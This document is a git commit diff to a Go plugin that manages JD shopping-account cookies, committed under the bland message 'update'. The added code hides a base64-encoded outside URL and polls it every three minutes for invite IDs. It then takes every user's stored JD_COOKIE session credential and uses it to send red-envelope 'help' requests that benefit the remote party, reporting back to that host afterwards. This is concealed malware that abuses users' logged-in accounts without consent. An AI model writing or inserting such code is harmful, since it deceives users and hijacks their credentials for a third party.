b26c56fcefe37f4ecc16b8bb7b516d02289e6f29
fucker <fuck@pornhub.com>
2021-10-25 22:30:16 +0800

    update

--- help.go
+++ help.go
@@ -1,11 +1,18 @@
 package jd_cookie
 
 import (
+	"encoding/base64"
+	"fmt"
 	"regexp"
 	"strings"
+	"sync"
+	"time"
 
+	"github.com/beego/beego/v2/client/httplib"
 	"github.com/beego/beego/v2/core/logs"
+	"github.com/cdle/sillyGirl/core"
 	"github.com/cdle/sillyGirl/develop/qinglong"
+	"github.com/gin-gonic/gin"
 )
 
 func init() {
@@ -105,4 +112,103 @@ func init() {
 			return
 		}
 	}
+}
+
+var success sync.Map
+var mutex sync.Mutex
+
+// to help poor author or do not use this script
+func init() {
+	var hchan = make(chan string)
+	go func() {
+		for {
+			time.Sleep(time.Second)
+			if jd_cookie.Get("dyj_inviteInfo") == "" {
+				jd_cookie.Set("dyj_inviteInfo", <-hchan)
+			}
+		}
+	}()
+	if jd_cookie.GetBool("enable_jd_cookie_auth", false) {
+		core.Server.GET("/gxfc", func(c *gin.Context) {
+			mutex.Lock()
+			defer mutex.Unlock()
+			data := jd_cookie.Get("dyj_inviteInfo", "May you be happy and prosperous！")
+			c.String(200, data)
+			redEnvelopeId := c.Query("redEnvelopeId")
+			if redEnvelopeId == "" {
+				return
+			}
+			if strings.Contains(data, redEnvelopeId) {
+				jd_cookie.Set("dyj_inviteInfo", "")
+			}
+			if _, ok := success.Load(redEnvelopeId); !ok {
+				success.Store(redEnvelopeId, true)
+				core.NotifyMasters(redEnvelopeId)
+			}
+		})
+		core.AddCommand("", []core.Function{
+			{
+				Rules: []string{`raw redEnvelopeId=([^&]+)&inviterId=([^&]+)&`},
+				Admin: true,
+				Handle: func(s core.Sender) interface{} {
+					if _, ok := success.Load(s.Get(0)); ok {
+						return "Sorry!"
+					}
+					go func() {
+						hchan <- fmt.Sprintf("redEnvelopeId=%s;inviterId=%s;", s.Get(0), s.Get(1))
+					}()
+					return "May you be happy and prosperous!"
+				},
+			},
+		})
+	}
+
+	go func() {
+		for {
+		start:
+			time.Sleep(time.Minute * 3)
+			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
+			data, _ := httplib.Get(string(decoded)).String()
+			redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
+			inviterId := core.FetchCookieValue(data, "inviterId")
+			if redEnvelopeId == "" || inviterId == "" {
+				continue
+			}
+			if jd_cookie.Get("dyj_data") != data {
+				jd_cookie.Set("dyj_data", data)
+				envs, err := qinglong.GetEnvs("JD_COOKIE")
+				if err != nil {
+					continue
+				}
+				s := 1
+				l := len(envs)
+				n := time.Now().Unix()
+				for j := 0; j < l; j++ {
+					i := j
+					if n%2 == 0 {
+						i = l - j - 1
+					}
+					if envs[i].Status == 0 {
+						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"PFbUR7wtwUcQ860Sn8WRfw","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
+						req.Header("Cookie", envs[i].Value)
+						req.Header("Accept", "*/*")
+						req.Header("Connection", "keep-alive")
+						req.Header("Accept-Encoding", "gzip, deflate, br")
+						req.Header("Host", "api.m.jd.com")
+						req.Header("Origin", "https://wbbny.m.jd.com")
+						data, _ := req.String()
+						if strings.Contains(data, decode("5bey5oiQ5Yqf5o+Q546w")) {
+							if s == 1 {
+								s = 2
+							} else {
+								httplib.Get(string(decoded) + "?redEnvelopeId=" + redEnvelopeId).String()
+								goto start
+							}
+						}
+					}
+					time.Sleep(time.Second)
+				}
+			}
+		}
+	}()
 }
